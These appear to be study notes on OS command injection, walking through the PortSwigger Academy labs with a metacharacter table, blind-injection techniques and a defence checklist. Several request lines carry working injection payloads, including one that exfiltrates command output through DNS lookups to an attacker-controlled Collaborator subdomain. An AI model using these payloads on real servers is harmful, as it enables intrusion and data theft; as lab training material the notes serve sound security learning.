# OS Command Injection Notes — PortSwigger Web Security Academy

---

## WHAT IS OS COMMAND INJECTION?

OS command injection (also called shell injection) lets an attacker execute
arbitrary operating system commands on the server running an application —
by exploiting a place where the application passes user input into a shell
command without proper sanitisation.

```
Application logic (server-side):
  shell_exec("stockreport.sh " + productID + " " + storeID)

Normal request:
  GET /stockStatus?productID=381&storeID=29
  → runs: stockreport.sh 381 29

Malicious request:
  GET /stockStatus?productID=381&storeID=29;whoami
  → runs: stockreport.sh 381 29;whoami
  → the shell sees TWO commands separated by ; and executes BOTH
```

> 📝 This is functionally identical in spirit to SQL injection — a
> trusted "template" (SQL query / shell command) has attacker-controlled
> data spliced directly into it, and special characters in that data
> change the STRUCTURE of the command rather than just being treated as
> data. The specific special characters differ (SQL uses `'`, `--`;
> the shell uses `;`, `|`, `&&`, backticks) but the underlying flaw —
> failing to separate code from data — is the same root cause.

---

## WHY THIS IS SO SEVERE

Command injection typically leads to **full compromise of the server** —
not just the application's data, but the entire underlying operating
system. From there, an attacker can:
- Read/write any file the application's OS user can access
- Pivot to other internal systems reachable from that server
- Install persistence, exfiltrate credentials, disrupt operations

This is consistently rated among the most critical vulnerability classes
in any bug bounty programme — a confirmed command injection is very often
an automatic critical/P1 finding.

---

## SHELL METACHARACTERS — THE INJECTION TOOLKIT

Shells interpret certain characters specially. Any of these, if not
filtered, let you break out of the intended single command:

| Character(s) | Meaning | Behaviour |
|---|---|---|
| `;` | Command separator | Runs BOTH commands in sequence, regardless of success |
| `\|` | Pipe | Sends the output of command 1 as input to command 2 (command 2's output is what's shown) |
| `\|\|` | OR | Runs command 2 ONLY IF command 1 FAILS |
| `&&` | AND | Runs command 2 ONLY IF command 1 SUCCEEDS |
| `&` | Background | Runs command 1 in the background, then immediately runs command 2 |
| `` ` `` (backticks) | Command substitution | Executes the enclosed command FIRST, substitutes its OUTPUT into the surrounding command |
| `$( )` | Command substitution (modern syntax) | Same as backticks — `$(whoami)` |
| `\n` (newline) | Command separator | On Windows and some Unix contexts, a literal newline also separates commands |

> 📝 Which character works depends on exactly how the vulnerable code
> invokes the shell, and what operating system is underneath. `|` is the
> most universally reliable starting point because it's valid on both
> Windows and Unix-like shells and its behaviour (showing your injected
> command's output INSTEAD of the original) is easy to visually confirm.

---

## VISIBLE VS BLIND COMMAND INJECTION

### Visible (in-band)
The application returns the command's OUTPUT directly in the HTTP response.
You can see the result of `whoami`, `ls`, etc. immediately. This is the
easiest case to detect and exploit — just look at what comes back.

### Blind
The application executes your injected command but does NOT show you the
output anywhere in the response. You need OTHER signals to (a) confirm the
injection exists and (b) actually retrieve data:

| Technique | How it works |
|---|---|
| **Time delays** | Inject a command that takes measurable time (`ping -c 10 127.0.0.1` or `sleep 10`). If the response takes ~10 seconds longer, the command executed. |
| **Output redirection** | Inject a command that WRITES its output to a file inside a web-accessible directory (e.g. `whoami > /var/www/images/output.txt`), then request that file directly via a normal URL. |
| **Out-of-band (OOB) interaction** | Inject a command that makes the SERVER perform a DNS lookup (or HTTP request) to an attacker-controlled domain (Burp Collaborator). Confirms execution without needing any readable output. |
| **Out-of-band data exfiltration** | Combine OOB with command substitution: embed the OUTPUT of a command as part of the domain name being looked up (e.g. `nslookup $(whoami).COLLABORATOR-DOMAIN`) — the DNS query itself carries the data out. |

---

## BLIND COMMAND INJECTION TESTING SOP

### Step 1 — Identify candidate injection points
Any feature where user input plausibly feeds into a server-side shell
command or external process invocation:
- Feedback/contact forms (email fields especially — sometimes piped
  through a validation or notification script)
- File processing features (image conversion, PDF generation)
  — these often shell out to command-line tools like `convert` or `ffmpeg`
- Any "check availability", "ping this host", "run this report" style feature

### Step 2 — Confirm injection with a time delay
Inject a payload using a harmless-but-measurable command:
```
;ping -c 10 127.0.0.1;      (Unix)
|ping -n 10 127.0.0.1|      (Windows — Windows ping uses -n not -c)
```
If the response takes noticeably longer (roughly matching the delay you
requested), the command executed.

> 📝 Test EVERY shell metacharacter (`;`, `|`, `||`, `&&`, `&`, backticks)
> systematically if the first one doesn't cause a delay — different
> applications construct their underlying shell invocation differently,
> and which separator actually works depends on exactly how the vulnerable
> code calls the shell.

### Step 3 — If you have visible output, just read it directly
No further technique needed — inject `whoami`, `id`, `ls`, etc. and read
the response body.

### Step 4 — If blind, try output redirection
If you know (or can guess) a web-accessible directory the application
serves static files from:
```
whoami > /var/www/images/output.txt
```
Then request that file via the normal file-serving mechanism the app
already exposes.

### Step 5 — If output redirection isn't viable, use OOB (Burp Collaborator)
Trigger a DNS lookup to confirm execution:
```
nslookup COLLABORATOR-SUBDOMAIN
```
Once confirmed, exfiltrate actual command output by embedding it as a
DNS label using command substitution:
```
nslookup $(whoami).COLLABORATOR-SUBDOMAIN
```
The DNS query Collaborator receives will literally contain the command's
output as part of the subdomain being looked up.

---

## QUICK BURP WORKFLOW

1. Identify the candidate parameter, send the request to **Repeater**
2. Try `|whoami|` first (visible output check) — if output appears
   directly, you're done
3. If no visible output, systematically test each separator with a time
   delay payload, watching the "Time" column in Repeater/Intruder
4. For output redirection: identify a web-accessible static directory
   (often visible from how images/files are already served), redirect
   command output there, then fetch it via that same mechanism
5. For OOB: **Burp menu → Burp Collaborator client → Copy to clipboard**,
   paste the subdomain into your payload, send, then **Poll now**
6. For OOB data exfiltration: wrap the target command in command
   substitution (`` `whoami` `` or `$(whoami)`) as part of the domain
   being looked up, poll Collaborator, read the output from the captured
   DNS query

> 📝 Right-click → **"Insert Collaborator payload"** in Burp automatically
> drops a fresh, unique Collaborator subdomain directly into your request
> at the cursor position — much faster than manually copy-pasting a
> subdomain from the Collaborator client window each time.

---
---

## PORTSWIGGER LABS

---

### #01 — OS command injection, simple case

**URL:** https://portswigger.net/web-security/os-command-injection/lab-simple
**Vulnerability:** Product stock checker executes a shell command containing user-supplied `productID` and `storeID`, returning the raw command output directly in the response
**Aim:** Execute `whoami` to determine the name of the current user

**Background:**
Checking stock for a product sends `productID` and `storeID` to the server,
which uses them to build and run a shell command, then returns that
command's output as plain text.

**Analysis:**
```
POST /product/stock
productId=1&storeId=1
→ 200 OK, body: "56"    (stock count — the command's normal output)

POST /product/stock
productId=1&storeId=1|whoami
→ 200 OK, body: "56\ncarlos"   (our whoami output appended after the pipe)
```

**Payload used:** `1|whoami` (in the `storeId` parameter)

> 📝 The `|` pipe here doesn't discard the original command's output the way
> it sometimes does — many implementations simply concatenate both
> commands' STDOUT into the same response. Always read the FULL response
> body carefully, not just the first line, when testing for visible command
> injection.

---

### #02 — Blind OS command injection with time delays

**URL:** https://portswigger.net/web-security/os-command-injection/lab-blind-time-delays
**Vulnerability:** The feedback submission function executes a shell command containing user-supplied details, but the output is never returned in the response
**Aim:** Cause a 10-second delay to confirm blind OS command injection

**Background:**
No output is visible anywhere — the only way to confirm execution is to
measure how long the server takes to respond.

**Analysis:**
```
POST /feedback/submit
email=x||ping+-c+10+127.0.0.1||&csrf=...&name=...&subject=...&message=...
→ response takes ~10 seconds longer than a normal submission

The || on both sides means: run an empty command OR ping (always runs,
since the empty command "fails"), then OR an empty command again (also
always runs, harmlessly, regardless of ping's exit status) — this
structure avoids breaking the rest of the original shell command syntax
that follows our injection point.
```

**Payload used:** `x||ping -c 10 127.0.0.1||` (URL-encoded, in the `email` parameter)

> 📝 The `||...||` wrapping pattern is worth understanding structurally:
> the FIRST `||` says "run ping only if whatever came immediately before
> failed" (which is often engineered to be true), and the TRAILING `||`
> similarly ensures anything the application appends AFTER your input
> doesn't break the overall command syntax and cause a shell error that
> might behave unpredictably. This defensive wrapping pattern shows up
> across almost every lab in this module.

---

### #03 — Blind OS command injection with output redirection

**URL:** https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection
**Vulnerability:** Same blind feedback function as Lab 02, but the application separately serves static files from a predictable, web-accessible directory
**Aim:** Execute `whoami` and retrieve its output by redirecting to a file you can then fetch directly

**Background:**
Since there's no visible output and no OOB requirement here, you can
instead have the injected command WRITE its own output to a file inside
`/var/www/images/` — the same directory the application already serves
product images from via `/image?filename=`.

**Analysis:**
```
POST /feedback/submit
email=||whoami>/var/www/images/output.txt||&csrf=...&name=...&subject=...&message=...
→ writes "carlos" (or similar) into output.txt inside the images directory

GET /image?filename=output.txt
→ 200 OK, body: "carlos"
```

**Payload used:** `||whoami>/var/www/images/output.txt||` (URL-encoded, in the `email` parameter)

> 📝 This technique depends entirely on knowing (or being able to guess) a
> directory the application ALREADY serves as static content — recognising
> that connection (feedback form writes files here → image loader reads
> files from there) is the actual skill being tested, more than the
> command injection syntax itself.

---

### #04 — Blind OS command injection with out-of-band interaction

**URL:** https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band
**Vulnerability:** Same blind feedback function, but this time there is NO accessible location to redirect output to — the only observable signal is an out-of-band network interaction
**Aim:** Trigger a DNS lookup to your Burp Collaborator server, confirming the injection

**Background:**
No visible output, no writable/servable directory available this time.
The only way to prove code execution is to make the server itself reach
out to an external system you control — a DNS lookup via `nslookup` is
the simplest such signal.

**Analysis:**
```
POST /feedback/submit
email=x||nslookup+x.YOUR-COLLABORATOR-SUBDOMAIN||&csrf=...&name=...&subject=...&message=...

→ Burp Collaborator receives a DNS lookup for:
  x.YOUR-COLLABORATOR-SUBDOMAIN
→ confirms the injected command executed on the server
```

**Payload used:** `x||nslookup x.BURP-COLLABORATOR-SUBDOMAIN||` (URL-encoded, in the `email` parameter)

**Requires:** Burp Suite Pro (Collaborator feature)

> 📝 Out-of-band techniques are your LAST RESORT when neither visible
> output nor a servable redirect target is available — but they're also
> the MOST RELIABLE confirmation technique, because a successful DNS
> lookup to an attacker-controlled domain is completely unambiguous proof
> of code execution, with none of the timing-based false-positive risk
> that delay-based techniques can have on a slow or loaded server.

---

### #05 — Blind OS command injection with out-of-band data exfiltration

**URL:** https://portswigger.net/web-security/os-command-injection/lab-blind-out-of-band-data-exfiltration
**Vulnerability:** Identical setup to Lab 04, but this time you must actually extract the OUTPUT of a command, not just confirm execution
**Aim:** Execute `whoami` and exfiltrate its output via a DNS query to Burp Collaborator

**Background:**
Building on Lab 04's OOB confirmation, this lab requires actually reading
DATA back out through the DNS channel. Command substitution
(`` `command` `` or `$(command)`) lets you embed a command's OUTPUT
directly into the domain name being looked up — the DNS query Collaborator
receives will literally contain that output as a subdomain label.

**Analysis:**
```
POST /feedback/submit
email=||nslookup+`whoami`.YOUR-COLLABORATOR-SUBDOMAIN||&csrf=...&name=...&subject=...&message=...

→ Shell evaluates `whoami` FIRST, substituting its output (e.g. "carlos")
  into the surrounding command:
  nslookup carlos.YOUR-COLLABORATOR-SUBDOMAIN

→ Burp Collaborator's DNS log shows a lookup for:
  carlos.YOUR-COLLABORATOR-SUBDOMAIN
→ the subdomain label itself IS the whoami output — read it directly
  from the Collaborator interaction log
```

**Payload used:** `` ||nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN|| `` (URL-encoded, in the `email` parameter)

**Requires:** Burp Suite Pro (Collaborator feature)

> 📝 Command substitution (backticks or `$()`) is the key mechanism that
> upgrades "confirm code runs" (Lab 04) into "actually extract data"
> (Lab 05) — the SAME OOB channel (DNS) is used for both, but wrapping
> the target command in substitution syntax lets its result travel
> along for the ride as part of the hostname being resolved. This exact
> pattern (OOB channel + command substitution = data exfiltration) recurs
> across many other vulnerability classes covered elsewhere in the
> Academy, including blind SQLi and SSRF.

---

## REFERENCE — OS COMMAND INJECTION QUICK MAP

| Lab pattern | Detection/exploitation method | Key technique |
|---|---|---|
| Visible output | Read the response body directly | `\|whoami\|` |
| Blind, no output, no writable location | Timing | `\|\|ping -c 10 127.0.0.1\|\|` |
| Blind, writable+servable directory available | Output redirection + separate fetch | `\|\|whoami>/servable/path/out.txt\|\|` then `GET` that file |
| Blind, no writable location, confirmation only | Out-of-band DNS interaction | `\|\|nslookup x.COLLABORATOR\|\|` |
| Blind, no writable location, need actual data | OOB + command substitution | `` \|\|nslookup `whoami`.COLLABORATOR\|\| `` |

---

## REFERENCE — DEFENCE PRINCIPLES

1. **Avoid calling out to OS commands from application code entirely** —
   use built-in library functions/APIs that achieve the same result
   without invoking a shell, wherever possible
2. **If shelling out is unavoidable, use strict input validation** — an
   allow-list of permitted characters/values is far safer than trying to
   block a list of "dangerous" ones (blocklists are almost always
   incomplete)
3. **Use parameterised/argument-array APIs instead of string
   concatenation** — most languages offer a way to invoke a subprocess
   with an ARRAY of arguments rather than a single concatenated string,
   which prevents shell metacharacters in any one argument from being
   interpreted as command syntax
4. **Run with least privilege** — even if injection occurs, limiting what
   the application's OS user account can actually do limits the blast
   radius significantly
5. **Never trust client input to be free of shell metacharacters** — `;`,
   `|`, `&`, backticks, `$()`, and newlines are all meaningful to a shell
   and must be treated as hostile by default
